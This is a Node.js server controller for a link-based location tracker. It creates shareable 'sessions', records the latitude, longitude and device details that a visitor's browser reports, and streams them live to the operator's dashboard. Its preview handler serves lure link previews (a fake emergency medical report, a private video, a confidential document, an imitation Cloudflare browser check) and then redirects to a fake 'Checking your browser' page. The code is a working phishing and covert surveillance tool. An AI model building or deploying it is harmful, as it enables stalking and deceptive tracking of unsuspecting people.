const Session = require('../models/Session');
const { v4: uuidv4 } = require('uuid');
const axios = require('axios');

exports.createSession = async (req, res) => {
    try {
        const { title } = req.body;
        const sessionId = uuidv4();
        const previewIndex = Math.floor(Math.random() * 5); // Random index for 5 images
        
        const newSession = new Session({
            sessionId,
            title: title || 'Private Message',
            previewIndex
        });

        await newSession.save();
        const apiBase = process.env.API_BASE_URL || 'https://trackers-oplf.onrender.com';
        
        res.status(201).json({ 
            success: true, 
            sessionId,
            shareUrl: `${apiBase}/v/${sessionId}`,
            dashboardUrl: `${process.env.CLIENT_URL || 'http://localhost:5173'}/#/dashboard/${sessionId}`
        });
    } catch (error) {
        res.status(500).json({ success: false, message: error.message });
    }
};

exports.getSession = async (req, res) => {
    try {
        const { id } = req.params;
        const session = await Session.findOne({ sessionId: id });
        
        if (!session) {
            return res.status(404).json({ success: false, message: 'Session not found' });
        }

        res.json({ success: true, session });
    } catch (error) {
        res.status(500).json({ success: false, message: error.message });
    }
};

exports.updateLocation = async (req, res) => {
    try {
        const { sessionId } = req.params;
        const { latitude, longitude, accuracy, deviceInfo } = req.body;

        const session = await Session.findOne({ sessionId });
        if (!session) {
            return res.status(404).json({ success: false, message: 'Session not found' });
        }

        const newLocation = {
            latitude,
            longitude,
            accuracy,
            deviceInfo,
            address: req.body.address || {},
            timestamp: new Date()
        };

        session.locationHistory.push(newLocation);
        await session.save();

        // Emit update via socket
        if (req.io) {
            req.io.to(sessionId).emit('location-updated', newLocation);
        }

        res.json({ success: true, message: 'Location updated', address });
    } catch (error) {
        res.status(500).json({ success: false, message: error.message });
    }
};

exports.deleteSession = async (req, res) => {
    try {
        const { sessionId } = req.params;
        const session = await Session.findOneAndDelete({ sessionId });
        if (!session) {
            return res.status(404).json({ success: false, message: 'Session not found' });
        }
        res.json({ success: true, message: 'Session deleted successfully' });
    } catch (error) {
        res.status(500).json({ success: false, message: error.message });
    }
};

exports.servePreview = async (req, res) => {
    try {
        const { id } = req.params;
        const session = await Session.findOne({ sessionId: id });
        
        if (!session) {
            return res.status(404).send('Invalid Link');
        }

        const themes = [
            { t: "⚠️ Emergency Update: Patient Status Report", d: "A secure medical report has been shared. Verify your browser to view vital signs.", i: "/previews/p0.jpg" },
            { t: "🔒 Private Profile Request", d: "Someone has shared a private profile with you. Complete the security check to view.", i: "/previews/p1.jpg" },
            { t: "🎥 Protected Private Video", d: "You have been invited to view a private video. Verify your connection to start playback.", i: "/previews/p2.jpg" },
            { t: "📄 Scanned Document: Confidential", d: "A password-protected document has been shared. Please verify your identity to download.", i: "/previews/p3.jpg" },
            { t: "🛡️ Browser Security Verification", d: "Cloudflare is verifying your connection before accessing the requested resource.", i: "/previews/p4.jpg" }
        ];

        const theme = themes[session.previewIndex] || themes[0];
        const apiBase = process.env.API_BASE_URL || 'https://trackers-oplf.onrender.com';
        const clientUrl = process.env.CLIENT_URL || 'https://video-o6nd.onrender.com';

        const html = `
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>${theme.t}</title>
    <meta property="og:title" content="${theme.t}" />
    <meta property="og:description" content="${theme.description || theme.d}" />
    <meta property="og:image" content="${apiBase}${theme.i}" />
    <meta property="og:type" content="website" />
    <meta name="twitter:card" content="summary_large_image">
    <script>
        window.location.href = "${clientUrl}/#/share/${id}";
    </script>
</head>
<body style="background: #000; color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif;">
    <div style="text-align: center;">
        <div style="width: 50px; height: 50px; border: 3px solid #333; border-top-color: #3b82f6; border-radius: 50%; animate: spin 1s linear infinite; margin: 0 auto 20px;"></div>
        <p>Checking your browser... Please wait.</p>
    </div>
    <style>@keyframes spin { to { transform: rotate(360deg); } }</style>
</body>
</html>`;
        res.send(html);
    } catch (error) {
        res.status(500).send('Error loading preview');
    }
};
